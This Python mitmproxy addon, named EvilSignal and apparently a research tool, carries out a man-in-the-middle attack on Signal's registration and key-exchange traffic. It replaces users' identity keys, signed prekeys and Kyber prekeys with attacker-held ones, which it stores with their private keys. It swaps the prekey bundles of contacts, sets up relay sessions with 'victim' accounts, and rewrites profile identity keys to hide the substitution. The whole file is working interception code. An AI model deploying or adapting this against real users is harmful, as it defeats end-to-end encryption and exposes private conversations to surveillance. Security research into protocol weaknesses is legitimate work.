import base64
from copy import deepcopy

import mitmproxy.websocket
from mitmproxy.addonmanager import Loader
from mitmproxy.http import HTTPFlow, Request, Response, Headers
from mitmproxy.net.http.status_codes import RESPONSES
from dataclasses import dataclass
from typing import Optional, Union
import logging
# FORMAT = "[%(filename)s:%(lineno)s-%(funcName)20s()] %(message)s"
# logging.basicConfig(format=FORMAT)
# logging.getLogger('mitmproxy').
import time
import config

from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
import json
from signal_protocol import state, helpers
from signal_protocol.address import ProtocolAddress, DeviceId
from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
from signal_protocol.curve import PublicKey, PrivateKey
from signal_protocol.sealed_sender import sealed_sender_decrypt
from signal_protocol import kem
from base64 import b64decode, b64encode

import src.utils as utils
from src.constants import TRUST_ROOT_STAGING_PK
from database import User, Device, LegitBundle, MitMBundle
from enum import Enum
import parse

from protos.gen.SignalService_pb2 import Content, Envelope, DataMessage
from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
from signal_protocol.protocol import CiphertextMessage

from src.server_proto import addons, HOST_HTTPBIN
from src.mitm_interface import MitmUser
from collections import defaultdict


# logging.getLogger().addHandler(utils.ColorHandler())
# todo -- fix logging precedence -- https://stackoverflow.com/a/20280587
# logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
# logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
# logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
# logging.getLogger('xepor.xepor').setLevel(logging.INFO)
# logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy

def dataMessageFlags(flags_value: int):
    from protos.gen.SignalService_pb2 import DataMessage
    # Check which flags are set in the flags_value
    flags_set = {
        'END_SESSION': bool(flags_value & DataMessage.END_SESSION),
        'EXPIRATION_TIMER_UPDATE': bool(flags_value & DataMessage.EXPIRATION_TIMER_UPDATE),
        'PROFILE_KEY_UPDATE': bool(flags_value & DataMessage.PROFILE_KEY_UPDATE),
    }
    return flags_set

class CiphertextMessageType(Enum):
    WHISPER = 2
    PRE_KEY_BUNDLE = 3
    SENDER_KEY_DISTRIBUTION = 7
    PLAINTEXT = 8

class ContentHint(Enum):
    DEFAULT = 0  # This message has content, but you shouldn't expect it to be re-sent to you
    RESENDABLE = 1 # You should expect to be able to have this content be re-sent to you
    IMPLICIT = 2 # This message has no real content and likely cannot be re-sent to you

class EnvelopeType(Enum):
    # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
    UNKNOWN = 0
    CIPHERTEXT = 1
    KEY_EXCHANGE = 2
    PRE_KEY_BUNDLE = 3
    RECEIPT = 5
    UNIDENTIFIED_SENDER = 6
    reserved_SENDERKEY_MESSAGE = 7
    PLAINTEXT_CONTENT = 8


@dataclass
class PendingWebSocket():
    request: WebSocketRequestMessage = None
    response: WebSocketResponseMessage = None


websocket_open_state = defaultdict(PendingWebSocket)


@dataclass
class KeyData:
    IdenKey: Optional[str] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[dict] = None
    pq_PreKeys: Optional[dict] = None

    fake_IdenKey: Optional[str] = None
    fake_signed_pre_key: Optional[dict] = None
    fake_signed_pre_key_secret: Optional[str] = None

    fake_PreKeys: Optional[list[dict]] = None
    fake_secret_PreKeys: Optional[dict] = None

    fake_pq_PreKeys: Optional[list[dict]] = None
    fake_secret_pq_PreKeys: Optional[dict] = None

    fake_last_resort_key: Optional[dict] = None
    fake_secret_last_resort_key: Optional[str] = None


@dataclass
class RegistrationInfo:
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None
    registrationId: Optional[int] = None

    aciData: KeyData = None
    pniData: KeyData = None

    serialized_registration_req: Optional[dict] = None


@dataclass
class BobIdenKey:
    uuid: str
    identityKey: Optional[IdentityKeyPair] = None
    fake_identityKey: Optional[IdentityKeyPair] = None


registration_info: dict[str, RegistrationInfo] = None
conversation_session: dict[str, (MitmUser, MitmUser)] = dict()
bobs_bundle = dict()
REGISTRATION_INFO_PATH = "registration_info.json"

api = addons[0]


class EvilSignal(InterceptedAPI):
    wrapped_api = None

    def __init__(self, wrapped_api: InterceptedAPI):
        self.wrapped_api = wrapped_api
        logging.info(f"++++++++++++++++++++++++\nSTARTING mitm against: \n{HOST_HTTPBIN}\n++++++++++++++++++++++++")
        super().__init__(
            default_host=wrapped_api.default_host,
            host_mapping=wrapped_api.host_mapping,
            blacklist_domain=wrapped_api.blacklist_domain,
            request_passthrough=wrapped_api.request_passthrough,
            response_passthrough=wrapped_api.response_passthrough,
            respect_proxy_headers=wrapped_api.respect_proxy_headers,
        )
        if self.wrapped_api is not None:
            for route in self.wrapped_api.request_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.request_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.response_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.response_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.ws_request_routes.routes:
                host, path, mtype, handler = route
                self.ws_request_routes.add_route(host, path, mtype, handler)
            for route in self.wrapped_api.ws_response_routes.routes:
                host, path, mtype, handler = route
                self.ws_response_routes.add_route(host, path, mtype, handler)

    def load(self, loader: Loader):
        loader.add_option(
            name="conversation_session",
            typespec=dict,
            default=dict(),
            help="chat sessions",
        )

        super().load(loader)  # pass remaining to


api = EvilSignal(api)


def json_to_registrations(json_registrations: str) -> dict[str, RegistrationInfo]:
    loaded_dict = json.loads(json_registrations)
    return {key: utils.json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}


@api.route("/v1/registration", rtype=RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):
    # logging.info(f"ADDRESS {flow.client_conn.address[0]}")

    req = json.loads(flow.request.content)
    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())
    # todo: is this the first time?

    already_saved = registration_info.get(flow.client_conn.peername[0])
    if already_saved:
        logging.warning("Already saved. Serving the same bundle")
        flow.request.content = json.dumps(already_saved.serialized_registration_req).encode()
        return

    unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']
    registrationId = req['accountAttributes']['registrationId']

    aci_IdenKey = req['aciIdentityKey']
    pni_IdenKey = req['pniIdentityKey']

    aci_SignedPreKey = deepcopy(req['aciSignedPreKey'])
    pni_SignedPreKey = deepcopy(req['pniSignedPreKey'])

    aci_pq_lastResortKey = deepcopy(req['aciPqLastResortPreKey'])
    pni_pq_lastResortKey = deepcopy(req['pniPqLastResortPreKey'])

    aci_fake_IdenKey = IdentityKeyPair.generate()
    pni_fake_IdenKey = IdentityKeyPair.generate()

    # create keys for registration record
    fake_registration_keys, fake_registration_keys_secret = helpers.create_registration(
        aci_fake_IdenKey,
        pni_fake_IdenKey,
        aci_spk_id=aci_SignedPreKey['keyId'],
        pni_spk_id=pni_SignedPreKey['keyId'],
        aci_kyber_id=aci_pq_lastResortKey['keyId'],
        pni_kyber_id=pni_pq_lastResortKey['keyId'])

    logging.info(f"Registration info (keys): {fake_registration_keys.keys()}")

    # todo: assert id's are the same ^^
    assert fake_registration_keys['aciSignedPreKey']['keyId'] == req['aciSignedPreKey'][
        'keyId'], "registration: keyId mismatch for aciSignedPreKey"
    assert fake_registration_keys['pniSignedPreKey']['keyId'] == req['pniSignedPreKey'][
        'keyId'], "registration: keyId mismatch for pniSignedPreKey"
    assert fake_registration_keys['aciPqLastResortPreKey']['keyId'] == req['aciPqLastResortPreKey'][
        'keyId'], "registration: keyId mismatch for aciPqLastResortPreKey"
    assert fake_registration_keys['pniPqLastResortPreKey']['keyId'] == req['pniPqLastResortPreKey'][
        'keyId'], "registration: keyId mismatch for pniPqLastResortPreKey"

    req.update(fake_registration_keys)

    registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
        unidentifiedAccessKey=unidentifiedAccessKey,
        registrationId=registrationId,
        aciData=KeyData(
            IdenKey=aci_IdenKey,
            SignedPreKey=aci_SignedPreKey,
            pq_lastResortKey=aci_pq_lastResortKey,
            fake_IdenKey=aci_fake_IdenKey.to_base64(),
            fake_signed_pre_key=fake_registration_keys["aciSignedPreKey"],
            fake_signed_pre_key_secret=fake_registration_keys_secret["aciSignedPreKeySecret"],
            # fake_PreKeys = fake_registration_keys["aciPreKey"],
            # fake_secret_PreKeys = fake_registration_keys_secret["aciPreKeySecret"],
            # fake_pq_PreKeys = fake_registration_keys["aciPqPreKey"],
            # fake_secret_pq_PreKeys = fake_registration_keys_secret["aciPqPreKeySecret"],
            fake_last_resort_key=fake_registration_keys["aciPqLastResortPreKey"],
            fake_secret_last_resort_key=fake_registration_keys_secret["aciPqLastResortSecret"]
        ),
        pniData=KeyData(
            IdenKey=pni_IdenKey,
            SignedPreKey=pni_SignedPreKey,
            pq_lastResortKey=pni_pq_lastResortKey,
            fake_IdenKey=pni_fake_IdenKey.to_base64(),
            fake_signed_pre_key=fake_registration_keys["pniSignedPreKey"],
            fake_signed_pre_key_secret=fake_registration_keys_secret["pniSignedPreKeySecret"],
            # fake_PreKeys = fake_registration_keys["pniPreKey"],
            # fake_secret_PreKeys = fake_registration_keys_secret["pniPreKeySecret"],
            # fake_pq_PreKeys = fake_registration_keys["pniPqPreKey"],
            # fake_secret_pq_PreKeys = fake_registration_keys_secret["pniPqPreKeySecret"],
            fake_last_resort_key=fake_registration_keys["pniPqLastResortPreKey"],
            fake_secret_last_resort_key=fake_registration_keys_secret["pniPqLastResortSecret"]
        )
    )

    with open(REGISTRATION_INFO_PATH, "w") as f:
        data = json.dumps(registration_info, default=utils.dataclass_to_json)
        f.write(data)

    req_content = json.dumps(req).encode()
    with open("debug/registration_req.json", "wb") as file:
        file.write(req_content)

    flow.request.content = req_content


@api.route("/v1/verification/session", rtype=RouteType.RESPONSE)
def _v1_verif_errors(flow: HTTPFlow):
    status = flow.response.status_code
    seconds_left = flow.response.headers.get("Retry-After", -1)
    failcases = {
        403: "Verification failed for the provided Registration Recovery Password",
        409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
        422: "The request did not pass validation: isEverySignedKeyValid() failed",
        423: "Registration Lock failure.",
        429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)"
    }
    if status in failcases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {failcases[status]}]\n{flow.response.content}")


@api.route("/v1/verification/session/{sessionId}/code", rtype=RouteType.RESPONSE)
def _v1_verif_error(flow: HTTPFlow, sessionId: str):
    status = flow.response.status_code
    if status < 300:
        return
    resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
    logging.warning(
        f"Registration for session {sessionId} will likely fail due to verification error, got {status}: {resp_name}\n{flow.response.content}")


@api.route("/v1/registration", rtype=RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):
    # todo - move to discrete route once xepor matching bug is fixed
    status = flow.response.status_code
    seconds_left = flow.response.headers.get("Retry-After", -1)
    fail_cases = {
        403: "Verification failed for the provided Registration Recovery Password",
        409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
        422: "The request did not pass validation: `isEverySignedKeyValid` (https://github.com/signalapp/Signal-Server/blob/9249cf240e7894b54638784340231a081a2e4eda/service/src/main/java/org/whispersystems/textsecuregcm/entities/RegistrationRequest.java#L100-L106) failed",
        423: "Registration Lock failure.",
        429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)"
    }
    if status in fail_cases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {fail_cases[status]}\n{flow.response.content}"
        )
        return

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.peername[0]

    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    user = User.insert(
        pNumber=resp["number"],
        aci=resp["uuid"],
        pni=resp["pni"],
        isVictim=True
    )

    device = Device.insert(
        aci=resp["uuid"],
        pni=resp["pni"],
        deviceId=1,
        aciIdenKey=registration_info[ip_address].aciData.IdenKey,
        pniIdenKey=registration_info[ip_address].pniData.IdenKey,
        unidentifiedAccessKey=registration_info[ip_address].unidentifiedAccessKey,
    )

    user.on_conflict_replace().execute()
    device.on_conflict_replace().execute()

    registration_info[ip_address].aci = resp["uuid"]
    registration_info[ip_address].pni = resp["pni"]

    api.myGreatString = 'Grump!!'


    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))


@api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):
    logging.info(api.myGreatString)
    identity = flow.request.query["identity"]
    req = json.loads(flow.request.content)
    address = flow.client_conn.peername[0]

    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    if not registration_info.get(address):
        logging.error(
            f"Address {address} not found in registration_info. {registration_info}")  # if errors, might as well become starbucks baristas
        return

    key_data = registration_info.get(address).aciData if identity == "aci" else registration_info.get(address).pniData

    try:
        alice_identity_key_pair = IdentityKeyPair.from_base64(key_data.fake_IdenKey.encode())
    except KeyError:
        logging.error(f"{flow} AND {registration_info}")
        return

    pq_pre_keys = deepcopy(req["pqPreKeys"])
    pre_keys = deepcopy(req["preKeys"])

    key_data.pq_PreKeys = pq_pre_keys
    key_data.PreKeys = pre_keys

    from signal_protocol.curve import KeyPair
    spk: KeyPair = KeyPair.from_public_and_private(
        base64.b64decode(key_data.fake_signed_pre_key["publicKey"]),
        base64.b64decode(key_data.fake_signed_pre_key_secret)
    )

    last_kyber: kem.KeyPair = kem.KeyPair.from_public_and_private(
        base64.b64decode(key_data.fake_last_resort_key["publicKey"]),
        base64.b64decode(key_data.fake_secret_last_resort_key)
    )

    fake_pre_keys, fake_secret_pre_keys = helpers.create_keys_data(
        100,
        alice_identity_key_pair,
        spk,
        last_kyber,
        pre_keys[0]["keyId"],
        pq_pre_keys[0]["keyId"]
    )  ## spk is a string, wtf is the keyId?

    ## todo for later: Make sure all the keys we generate are stored in the database

    req.update(fake_pre_keys)

    key_data.fake_PreKeys = fake_pre_keys["preKeys"]
    key_data.fake_secret_PreKeys = fake_secret_pre_keys["preKeys"]
    key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
    key_data.fake_secret_pq_PreKeys = fake_secret_pre_keys["pqPreKeys"]

    legit_bundle = LegitBundle.insert(
        type=identity,
        aci=registration_info[address].aci,
        deviceId=1,  # todo: shouldnt be static
        IdenKey=key_data.IdenKey,
        SignedPreKey=key_data.SignedPreKey,
        PreKeys=key_data.PreKeys,
        kyberKeys=key_data.pq_PreKeys,
        lastResortKyber=key_data.pq_lastResortKey,
    )

    fake_ik = {
        "publicKey": b64encode(alice_identity_key_pair.public_key().serialize()).decode("utf-8"),
        "privateKey": b64encode(alice_identity_key_pair.private_key().serialize()).decode("utf-8")
    }
    fake_spk = key_data.fake_signed_pre_key
    fake_spk["privateKey"] = deepcopy(key_data.fake_signed_pre_key_secret)
    pre_keys = utils.json_join_public(key_data.fake_PreKeys, key_data.fake_secret_PreKeys)
    fake_kyber = utils.json_join_public(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys)
    fake_last_resort = {
        "keyId": key_data.fake_last_resort_key["keyId"],
        "publicKey": key_data.fake_last_resort_key["publicKey"],
        "privateKey": key_data.fake_secret_last_resort_key
    }
    mitm_bundle = MitMBundle.insert(
        type=identity,
        aci=registration_info[address].aci,
        deviceId=1,  # todo: shouldnt be static
        FakeIdenKey=fake_ik,
        FakeSignedPreKey=fake_spk,
        FakePrekeys=pre_keys,
        fakeKyberKeys=fake_kyber,
        fakeLastResortKyber=fake_last_resort
    )

    legit_bundle.on_conflict_replace().execute()
    mitm_bundle.on_conflict_replace().execute()

    # prevent regressions
    assert "privateKey" not in req['pqPreKeys'][0]
    assert "privateKey" not in req['preKeys'][0]

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    # req['pqLastResortPreKey'] = {
    #     "keyId": fake_last_resort["keyId"],
    #     "publicKey": fake_last_resort["publicKey"],
    # } # todo: otherwise remove it
    req['pqLastResortPreKey'] = None
    req['signedPreKey'] = None
    # todo: fix upstream

    req_content = json.dumps(req).encode()
    with open("debug/registration_keys.json", "wb") as file:
        file.write(req_content)

    flow.request.content = req_content


@api.route("/v2/keys", rtype=RouteType.RESPONSE)
def v2_keys_errors(flow: HTTPFlow):
    status = flow.response.status_code
    failcases = {
        401: "Account authentication check failed.",
        403: "Attempt to change identity key from a non-primary device.",
        422: "Invalid request format (Invalid signatures -- not all sigs [pqPreKeys,pqLastResortPreKey,signedPreKey] are valid).",
    }
    if status in failcases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {failcases[status]}\n{flow.request.content}")


@api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):
    # TODO -- I need to be coherent if this endpoint is hit multiple times
    global registration_info

    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.peername[0]

    # logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
    identity, uuid = utils.strip_uuid_and_id(identifier)

    bob_identity_key_public = b64decode(resp["identityKey"])

    bobs_bundles = {}
    ############ MitmToBob setup (fake Alice)
    for id, bundle in enumerate(resp["devices"]):
        # data should be uuid of Alice and the device id (in this case 1 is ok)
        fake_ikp = MitMBundle.get_identity_keypair(key_type="aci", aci=registration_info[ip_address].aci, device_id=1)
        fake_ikp = IdentityKeyPair(
            IdentityKey.from_base64(fake_ikp["publicKey"].encode()),
            PrivateKey.from_base64(fake_ikp["privateKey"].encode())
        )
        alice_reg_id = registration_info[ip_address].registrationId
        # todo: fucked has the wrong spk (id at least so probably fucked somewehre else too)
        fakeVictim = MitmUser(ProtocolAddress(registration_info[ip_address].aci, bundle["deviceId"]),
                              RID=alice_reg_id,
                              identity_key=fake_ikp)

        bob_registration_id = bundle["registrationId"]

        bob_kyber_pre_key = bundle["pqPreKey"]
        bob_kyber_pre_key_public = b64decode(bob_kyber_pre_key["publicKey"])
        bob_kyber_pre_key_signature = b64decode(bob_kyber_pre_key["signature"] + "==")
        bob_kyber_pre_key_id = bob_kyber_pre_key["keyId"]

        bob_signed_pre_key = bundle["signedPreKey"]
        bob_signed_pre_key_public = b64decode(bob_signed_pre_key["publicKey"])
        bob_pre_key = bundle["preKey"]
        bob_pre_key_public = b64decode(bob_pre_key["publicKey"])

        device_id = int(bundle["deviceId"])

        bob_bundle = state.PreKeyBundle(
            bob_registration_id,
            DeviceId(device_id),
            (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
            state.SignedPreKeyId(bundle["signedPreKey"]["keyId"]),
            PublicKey.deserialize(bob_signed_pre_key_public),
            b64decode(bundle["signedPreKey"]["signature"] + "=="),
            IdentityKey(bob_identity_key_public),
        )

        bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                                                   kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                                   bob_kyber_pre_key_signature)
        try:
            assert bob_bundle.device_id().get_id() > 0
        except AssertionError:
            logging.error(f"Device ID is not greater than 0: {bob_bundle.device_id().get_id()}")

        logging.warning(f"registration infos: {registration_info.keys()}")
        # logging.warning(flow, ip_address)
        lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
            ip_address].pniData

        legit_bundle = LegitBundle.insert(
            type=identity.lower(),
            aci=uuid,
            deviceId=device_id,
            IdenKey=b64encode(bob_identity_key_public).decode("ascii"),
            SignedPreKey=bob_signed_pre_key,
            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
            PreKeys=[bob_pre_key],
            kyberKeys=[bob_kyber_pre_key],
            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
            lastResortKyber=lastResortPq.pq_lastResortKey  # need to get from registration_info
        )
        legit_bundle.on_conflict_replace().execute()
        fakeVictim.process_pre_key_bundle(ProtocolAddress(identifier, device_id), bob_bundle)
        bobs_bundles[device_id] = bob_bundle

    ############ Swap the prekeybundle TODO 

    for bundle in resp["devices"]:

        identity_key = bobs_bundle.get(uuid)
        bob_device_id = int(bundle["deviceId"])

        if not identity_key:
            # todo create row
            fakeUser = MitmUser(address=ProtocolAddress(uuid, bob_device_id), RID=bundle["registrationId"],
                                pre_key_id=bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"],
                                kyber_pre_key_id=bundle["pqPreKey"]["keyId"])
            identity_key = fakeUser.identity_key_pair

        else:
            fakeUser = MitmUser(address=ProtocolAddress(uuid, bob_device_id), RID=bundle["registrationId"],
                                pre_key_id=bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"],
                                kyber_pre_key_id=bundle["pqPreKey"]["keyId"],
                                identity_key=identity_key.fake_identityKey)
            identity_key = identity_key.fake_identityKey

        fakeBundle = fakeUser.pre_key_bundle.to_dict()

        logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")

        fakeBundle_wire = {
            "identityKey": b64encode(identity_key.public_key().serialize()).decode("utf-8"),
            "devices": [
                {
                    "deviceId": 1,
                    "registrationId": bundle["registrationId"],
                    "preKey": {
                        "keyId": fakeBundle["pre_key_id"],
                        "publicKey": fakeBundle["pre_key_public"]
                    },
                    "signedPreKey": {
                        "keyId": fakeBundle["signed_pre_key_id"],
                        "publicKey": fakeBundle["signed_pre_key_public"],
                        "signature": fakeBundle["signed_pre_key_sign"][:-2]  # todo: this freaks me out :/
                    },
                    "pqPreKey": {
                        "keyId": fakeBundle["kyber_pre_key_id"],
                        "publicKey": fakeBundle["kyber_pre_key_public"],
                        "signature": fakeBundle["kyber_pre_key_sign"][:-2]  # todo: fix this
                    }
                }
            ]
        }

        reg = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
            ip_address].pniData

        lastResortPq = {
            "keyId": reg.pq_lastResortKey.get("keyId", "42"),
            "publicKey": b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(),
            "privateKey": fakeUser.last_resort_kyber.get_private().to_base64(),
        }
        fake_ik = {
            "publicKey": identity_key.public_key().to_base64(),
            "privateKey": identity_key.private_key().to_base64()
        }
        target_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
        fake_spk = {
            "keyId": target_spk.get("keyId"),
            "publicKey": target_spk.get("publicKey"),
            "signature": target_spk.get("signature"),
            "privateKey": b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
        }
        # fake_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
        # fake_spk["privateKey"] = b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
        fake_pre_keys = [{
            "keyId": fakeBundle_wire["devices"][0]["preKey"]["keyId"],
            "publicKey": fakeBundle_wire["devices"][0]["preKey"]["publicKey"],
            "privateKey": fakeUser.pre_key_pair.private_key().to_base64()
        }]
        # fake_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
        target_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
        fake_kyber = {
            "keyId": target_kyber.get("keyId"),
            "publicKey": target_kyber.get("publicKey"),
            "signature": target_kyber.get("signature"),
            "privateKey": fakeUser.kyber_pre_key_pair.get_private().to_base64()
        }
        # fake_kyber["privateKey"] = fakeUser.kyber_pre_key_pair.get_private().to_base64()
        # logging.error()
        mitm_bundle = MitMBundle.insert(
            type=identity.lower(),
            aci=uuid,
            deviceId=device_id,
            FakeIdenKey=fake_ik,
            FakeSignedPreKey=fake_spk,
            FakePrekeys=fake_pre_keys,
            fakeKyberKeys=[fake_kyber],
            fakeLastResortKyber=lastResortPq
        )
        mitm_bundle.on_conflict_replace().execute()

    resp.update(fakeBundle_wire)

    for device_id, bundle in bobs_bundles.items():
        fakeUser.process_pre_key_bundle(ProtocolAddress(identifier, device_id), bundle)

    # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
    # ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
    # logging.warning(f"session {ctx.options.conversation_session}")
    conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
    # 0logging.warning(f"session {conversation_session}")
    logging.warning(f"active conversations: {conversation_session.keys()}")

    assert "privateKey" not in resp['devices'][0]['pqPreKey']
    assert "privateKey" not in resp['devices'][0]['signedPreKey']
    assert "privateKey" not in resp['devices'][0]['pqPreKey']

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    resp_content = json.dumps(resp).encode()
    with open(f"debug/fake_keys_{identifier}.json", "wb") as file:
        file.write(resp_content)

    flow.response.content = resp_content


    alice_uuid = registration_info.get(ip_address).aci
    aci_bundle: MitMBundle = MitMBundle.get(aci=alice_uuid, type="aci", deviceId=1)
    pni_bundle: MitMBundle = MitMBundle.get(aci=alice_uuid, type="pni", deviceId=1)

    from signal_protocol.state import SignedPreKeyRecord, SignedPreKeyId, PreKeyId, PreKeyRecord, KyberPreKeyId
    from signal_protocol.curve import KeyPair
    from signal_protocol.kem import KeyPair as KemKeyPair

    def __bundle_to_victim(fakeVictim, bundle: MitMBundle):
        spk = bundle.FakeSignedPreKey
        pre_keys = bundle.FakePrekeys
        kyber_keys = bundle.fakeKyberKeys
        # last_kyber = bundle.fakeLastResortKyber # todo: No sigs?

        spk_id = SignedPreKeyId(spk["keyId"])
        spk_record = SignedPreKeyRecord(
            spk_id,
            int(time.time()),
            KeyPair.from_public_and_private(
                base64.b64decode(spk["publicKey"]),
                base64.b64decode(spk["privateKey"])
            ),
            base64.b64decode(spk["signature"]),
        )
        fakeVictim.store.save_signed_pre_key(spk_id,spk_record)

        for k in pre_keys:
            pre_key_id = PreKeyId(k["keyId"])
            key_pair = KeyPair.from_public_and_private(
                base64.b64decode(k["publicKey"]),
                base64.b64decode(k["privateKey"])
            )
            pre_key_record = PreKeyRecord(
                pre_key_id, key_pair
            )
            fakeVictim.store.save_pre_key(pre_key_id, pre_key_record)

        for k in kyber_keys:
            kyber_id = k["keyId"]
            key_pair = KemKeyPair.from_public_and_private(
                base64.b64decode(k["publicKey"]),
                base64.b64decode(k["privateKey"])
            )
            kyber_record = utils.make_kyber_record(
                kyber_id,
                int(time.time()),
                key_pair,
                base64.b64decode(k["signature"]),
            )
            fakeVictim.store.save_kyber_pre_key(KyberPreKeyId(kyber_id), kyber_record)
        # todo: lastResortKyber does not have a signature

    __bundle_to_victim(fakeVictim, aci_bundle)
    __bundle_to_victim(fakeVictim, pni_bundle)

def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
    logging.info(f"my profile: {identifier} {version} {credentialRequest}")

    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    if registration_info.get(ip_address) is None:
        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
        return
    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")

    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
    flow.response.content = json.dumps(resp).encode()

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    return flow.response.content
    # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")


def _v1_ws_profile_futut(flow, identifier, version):
    global registration_info
    with open(REGISTRATION_INFO_PATH, "r") as f:
        registration_info = json_to_registrations(f.read())

    logging.info(f"my profile 2: {identifier} {version}")
    # raise RuntimeError(f"my profile: {identifier} {version}")
    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    if registration_info.get(ip_address) is None:
        logging.warning(f"Cannot find registration for key {ip_address}.\n{registration_info}\nEarly stop.")
        return

    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")

    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
    flow.response.content = json.dumps(resp).encode()

    with open(REGISTRATION_INFO_PATH, "w") as f:
        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))

    return flow.response.content


def _v1_ws_profile(flow, identifier):
    # message = flow.websocket.messages[-1]
    logging.info(f"{identifier}")
    try:
        uuid_type, uuid = utils.strip_uuid_and_id(identifier)
    except:
        logging.exception(f"Invalid identifier {identifier}")
        return
    content = json.loads(flow.response.content)

    logging.info(f"PROFILE: {content}")

    idenKey = content["identityKey"]

    bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()

    if bundle:
        public_fake_IdenKey = bundle.FakeIdenKey['publicKey']
    else:
        fake_IdenKey = IdentityKeyPair.generate()
        bobs_bundle[uuid] = BobIdenKey(uuid, idenKey, fake_IdenKey)
        public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")

    logging.info(f"BUNDLE: {bundle}")
    content["identityKey"] = public_fake_IdenKey

